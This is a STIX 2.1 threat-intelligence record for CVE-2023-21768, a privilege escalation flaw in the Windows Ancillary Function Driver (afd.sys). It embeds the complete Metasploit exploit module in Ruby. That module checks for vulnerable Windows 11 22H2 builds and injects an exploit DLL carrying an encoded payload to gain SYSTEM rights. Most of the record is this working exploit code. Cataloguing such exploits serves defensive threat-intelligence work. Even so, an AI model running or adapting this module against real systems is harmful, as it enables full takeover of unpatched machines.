{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7f0b819c-dde1-4e31-8d16-3d3e8c37f7db",
    "created": "2024-08-14T16:48:59.327727Z",
    "modified": "2024-08-14T16:48:59.327731Z",
    "name": "Ancillary Function Driver (AFD) for WinSock Elevation of Privilege",
    "description": " A vulnerability exists in the Windows Ancillary Function Driver for Winsock (`afd.sys`) can be leveraged by an attacker to escalate privileges to those of NT AUTHORITY\\SYSTEM. Due to a flaw in `AfdNotifyRemoveIoCompletion`, it is possible to create an arbitrary kernel Write-Where primitive, which can be used to manipulate internal I/O ring structures and achieve local privilege escalation.  This exploit only supports Windows 11 22H2 up to build 22621.963 (patched in January 2023 updates).  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/cve_2023_21768_afd_lpe.rb",
            "external_id": "cve_2023_21768_afd_lpe.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-21768"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/xforcered/Windows_LPE_AFD_CVE-2023-21768"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/yardenshafir/IoRingReadWritePrimitive"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Process\n  include Msf::Post::Windows::ReflectiveDLLInjection\n  include Msf::Post::Windows::FileInfo\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'Ancillary Function Driver (AFD) for WinSock Elevation of Privilege',\n          'Description' => %q{\n            A vulnerability exists in the Windows Ancillary Function Driver for Winsock\n            (`afd.sys`) can be leveraged by an attacker to escalate privileges to those of\n            NT AUTHORITY\\SYSTEM. Due to a flaw in `AfdNotifyRemoveIoCompletion`, it is\n            possible to create an arbitrary kernel Write-Where primitive, which can be used\n            to manipulate internal I/O ring structures and achieve local privilege\n            escalation.\n\n            This exploit only supports Windows 11 22H2 up to build 22621.963 (patched in\n            January 2023 updates).\n          },\n          'License' => MSF_LICENSE,\n          'Author' => [\n            'chompie', # Github PoC\n            'b33f', # Github PoC\n            'Yarden Shafir', # I/O Ring R/W primitive PoC\n            'Christophe De La Fuente' # Metasploit module\n          ],\n          'Arch' => [ ARCH_X64 ],\n          'Platform' => 'win',\n          'SessionTypes' => [ 'meterpreter' ],\n          'Privileged' => true,\n          'Targets' => [\n            [ 'Windows 11 22H2 x64', { 'Arch' => ARCH_X64 } ]\n          ],\n          'Payload' => {\n            'DisableNops' => true\n          },\n          'References' => [\n            [ 'CVE', '2023-21768' ],\n            [ 'URL', 'https://github.com/xforcered/Windows_LPE_AFD_CVE-2023-21768' ],\n            [ 'URL', 'https://github.com/yardenshafir/IoRingReadWritePrimitive' ]\n          ],\n          'DisclosureDate' => '2023-01-10',\n          'DefaultTarget' => 0,\n          'Notes' => {\n            'Stability' => [ CRASH_SAFE ],\n            'Reliability' => [ REPEATABLE_SESSION ],\n            'SideEffects' => []\n          }\n        }\n      )\n    )\n  end\n\n  def check\n    unless session.platform == 'windows'\n      return Exploit::CheckCode::Safe('Only Windows systems are affected')\n    end\n\n    major, minor, build, revision, _branch = file_version('C:\\\\Windows\\\\System32\\\\ntoskrnl.exe')\n    vprint_status(\"Windows Build Number = #{build}.#{revision}\")\n\n    unless major == 6 && minor == 2 && build == 22621\n      return CheckCode::Safe('The exploit only supports Windows 11 22H2')\n    end\n\n    if revision > 963\n      return CheckCode::Safe(\"This Windows host seems to be patched (build 22621.#{revision})\")\n    end\n\n    CheckCode::Appears\n  end\n\n  def exploit\n    if is_system?\n      fail_with(Failure::None, 'Session is already elevated')\n    end\n\n    if sysinfo['Architecture'] == ARCH_X64 && session.arch == ARCH_X86\n      fail_with(Failure::NoTarget, 'Running against WOW64 is not supported')\n    end\n\n    encoded_payload = payload.encoded\n    execute_dll(\n      ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2023-21768', 'CVE-2023-21768.x64.dll'),\n      [encoded_payload.length].pack('I<') + encoded_payload\n    )\n\n    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-01-10",
    "x_mitre_platforms": [
        "win'"
    ]
}